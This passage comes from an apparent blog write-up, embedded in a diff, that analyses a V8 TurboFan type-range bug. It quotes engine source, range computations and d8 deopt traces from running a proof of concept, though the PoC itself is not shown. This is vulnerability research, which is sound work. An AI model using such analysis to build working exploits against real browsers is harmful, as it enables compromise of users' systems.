+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   NodeInfo<span style="color:#f92672">*</span> info <span style="color:#f92672">=</span> GetInfo(node);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>   info<span style="color:#f92672">-&gt;</span>set_visited();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>   <span style="color:#66d9ef">bool</span> updated <span style="color:#f92672">=</span> UpdateFeedbackType(node);<span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>   TRACE(<span style="color:#e6db74">&#34; visit #%d: %sn&#34;</span>, node<span style="color:#f92672">-&gt;</span>id(), node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>mnemonic());
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>   VisitNode<span style="color:#f92672">&lt;</span>RETYPE<span style="color:#f92672">&gt;</span>(node, info<span style="color:#f92672">-&gt;</span>truncation(), <span style="color:#66d9ef">nullptr</span>); [<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>   TRACE(<span style="color:#e6db74">&#34;  ==&gt; output %sn&#34;</span>, MachineReprToString(info<span style="color:#f92672">-&gt;</span>representation()));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>   <span style="color:#66d9ef">return</span> updated;}
+</span></span></code></pre></div><p>Let’s see how the type information is updated for each of our important nodes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">UpdateFeedbackType</span>(Node<span style="color:#f92672">*</span> node) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   [...]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>   NodeInfo<span style="color:#f92672">*</span> info <span style="color:#f92672">=</span> GetInfo(node);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>   Type type <span style="color:#f92672">=</span> info<span style="color:#f92672">-&gt;</span>feedback_type();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>   Type new_type <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span>GetType(node);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>   Type input0_type;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>   <span style="color:#66d9ef">if</span> (node<span style="color:#f92672">-&gt;</span>InputCount() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) input0_type <span style="color:#f92672">=</span> FeedbackTypeOf(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">0</span>)); <span style="color:#75715e">//GetInfo(node)-&gt;feedback_type();
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>   Type input1_type;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>   <span style="color:#66d9ef">if</span> (node<span style="color:#f92672">-&gt;</span>InputCount() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) input1_type <span style="color:#f92672">=</span> FeedbackTypeOf(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>   <span style="color:#66d9ef">switch</span> (node<span style="color:#f92672">-&gt;</span>opcode()) {<span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>k<span style="color:#960050;background-color:#1e0010">##</span>Name: {   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>     <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>SpeculativeNumberSubtract:  {                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>       new_type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(op_typer_.SpeculativeNumberSubtract(input0_type, input1_type), info<span style="color:#f92672">-&gt;</span>restriction_type(), graph_zone());   [<span style="color:#ae81ff">5</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>      <span style="color:#66d9ef">break</span>;                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>	 <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kNumberMax: {                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>              new_type <span style="color:#f92672">=</span> op_typer_.NumberMax(input0_type, input1_type);  [<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>   	<span style="color:#66d9ef">break</span>;                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span> 	}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>     <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kPhi: {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>       new_type <span style="color:#f92672">=</span> TypePhi(node);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>       <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>type.IsInvalid()) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>         new_type <span style="color:#f92672">=</span> Weaken(node, type, new_type);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span>       }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span>       <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span><span>     }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span><span>   [...]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span><span>   new_type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(GetUpperBound(node), new_type, graph_zone());
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span><span>   <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>type.IsInvalid() <span style="color:#f92672">&amp;&amp;</span> new_type.Is(type)) <span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span><span>   GetInfo(node)<span style="color:#f92672">-&gt;</span>set_feedback_type(new_type); <span style="color:#75715e">// node-&gt;feedback_type_ = new_type [2]
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span><span>   <span style="color:#66d9ef">if</span> (v8_flags.trace_representation) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span><span>     PrintNodeFeedbackType(node);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63</span><span>   }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65</span><span>   <span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67</span><span> }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69</span><span> Type TypePhi(Node<span style="color:#f92672">*</span> node) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71</span><span>   <span style="color:#66d9ef">int</span> arity <span style="color:#f92672">=</span> node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>ValueInputCount();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73</span><span>   Type type <span style="color:#f92672">=</span> FeedbackTypeOf(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">0</span>)); 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75</span><span>   <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;</span> arity; <span style="color:#f92672">++</span>i) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77</span><span>     type <span style="color:#f92672">=</span> op_typer_.Merge(type, FeedbackTypeOf(node<span style="color:#f92672">-&gt;</span>InputAt(i))); [<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79</span><span>   }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81</span><span>   <span style="color:#66d9ef">return</span> type;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83</span><span> }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85</span><span>MachineRepresentation GetOutputInfoForPhi(Type type, Truncation use) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87</span><span>   <span style="color:#75715e">// Compute the representat[...]
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88</span><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89</span><span>   } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (type.Is(Type<span style="color:#f92672">::</span>Number())) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">91</span><span>     <span style="color:#66d9ef">return</span> MachineRepresentation<span style="color:#f92672">::</span>kFloat64; [<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">92</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">93</span><span>   }
+</span></span></code></pre></div><ul>
+<li>Node #21 Phi Node: Looking at the above code, the Phi Node&rsquo;s  (variable x in poc&rsquo;s range)  new_type which means the feedback_type[2] is set to Merge(input0, input1) which is union of inputs.
+<ul>
+<li>input0 = Range(-1,-1) #14</li>
+<li>Input1  = Range(0xFFFF_FFFF, 0xFFFF_FFFF) #20</li>
+<li>node-&gt;feedback_type_ =merge(input0, input1) = <code>Range(-1, 0xFFFFFFFF)</code></li>
+<li>In the Retype phase log output, we can see at #21 Static type the feedback_type is the merged version.</li>
+<li>After this in RetypeNode function [2]  VisitNode<!-- raw HTML omitted --> call the the Nodes output’s representation(node-&gt;info-&gt;representation()) is set to kRepFloat64, because as it is in Number Range [3].</li>
+</ul>
+</li>
+<li><strong>Node #52: Numbermax</strong> feedback_type is updated[4] by calling op_typer_.NumberMax() which essentially takes a maximum of either side of the ranges.
+<ul>
+<li>Input0 = Range(-1, 0xFFFF_FFFF)  #21</li>
+<li>Input1 = Range(0,0) #2</li>
+<li>node-&gt;feedback_type_  = (0,0xFFFF_FFFF)<br>
+double min = std::max(lhs.Min(), rhs.Min());<br>
+double max = std::max(lhs.Max(), rhs.Max());<br>
+type = Type::Union(type, Type::Range(min, max, zone()), zone());</li>
+<li>In the below trace #52 node-&gt;info-&gt;representation() which is the output’s representation is set to kRepWord64 given its final range.</li>
+</ul>
+</li>
+<li><strong>Node #41:</strong> Interestingly SpeculativeSafeIntegerSubtract new_type is [5] Intersection of input0 and input1 operands type and the restriction_type (kSigned32) from propagate phase
+<ul>
+<li>
+<p>Input0 = Range(0,0) #22</p>
+</li>
+<li>
+<p>Input1 = Range(0,0xFFFF_FFFF) #52:NumberMAx</p>
+</li>
+<li>
+<p>node-&gt;feedback_type_  = Intersection(OperationTyper::SpeculativeNumberSubtract(input0, input1)=&gt;(-4294967295, 0), restriction_type=kSigned32(-0x8000_0000, 0x7FFF_FFFF)) = (-2147483648, 0)</p>
+<ul>
+<li>Notice that the static type is overflowed for kSigned32, and feedback_type is restricted to Signed32 range.</li>
+</ul>
+</li>
+<li>
+<p>Finally in the trace, the output representation is set to <strong>kRepWord32.</strong></p>
+</li>
+<li>
+<p><strong>If you look closely, the output representation is set to <code>kRepWord32</code>. Doesn’t this mean the subtraction operates only on the lower 32 bits? Yep That’s correct; the subtraction does take place within the 32-bit range (<code>kRepWord32</code>). However, TurboFan continues with this 32-bit representation and produces optimized code with overflow checks, and if it detects overflow or precision loss during execution—which will happen in the PoC—it triggers a bailout and deoptimizes, switching to a more accurate, non-optimized execution path. And if we run our code in patched d8, the deoptimization takes place as below but not on our vulnerable d8.</strong></p>
+<blockquote>
+<p>&gt;./v8/out.gn/arm64.debug/d8 discord.js
+&ndash;allow-natives-syntax &ndash;trace-deopt &ndash;trace-opt</p>
+</blockquote>
+<p><strong>-4294967295</strong><br>
+<strong>0</strong><br>
+<strong>[manually marking 0x1472000491c5 &lt;JSFunction foos (sfi = 0x1472002992e1)&gt; for optimization to TURBOFAN_JS, ConcurrencyMode::kSynchronous]</strong><br>
+<strong>[compiling method 0x1472000491c5 &lt;JSFunction foos (sfi = 0x1472002992e1)&gt; (target TURBOFAN_JS), mode: ConcurrencyMode::kSynchronous]</strong><br>
+<strong>[completed compiling 0x1472000491c5 &lt;JSFunction foos (sfi = 0x1472002992e1)&gt; (target TURBOFAN_JS) - took 0.125, 10.333, 0.625 ms]</strong><br>
+<strong>[bailout (kind: deopt-eager, reason: lost precision): begin. deoptimizing 0x1472000491c5 &lt;JSFunction foos (sfi = 0x1472002992e1)&gt;, 0x112b000402cd <!-- raw HTML omitted -->, opt id 0, node id 97, bytecode offset 12, deopt exit 0, FP to SP delta 32, caller SP 0x00016b074ee0, pc 0x00016d340244]</strong><br>
+<strong>-4294967295</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#f92672">--</span>{Retype phase}<span style="color:#f92672">--</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#75715e">#21:Phi[kRepTagged](#14:NumberConstant, #20:NumberConstant, #18:Merge)  [Static type: Range(-1, 4294967295)] // variable x </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span> visit <span style="color:#75715e">#21: Phi</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  <span style="color:#f92672">==&gt;</span> output kRepFloat64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
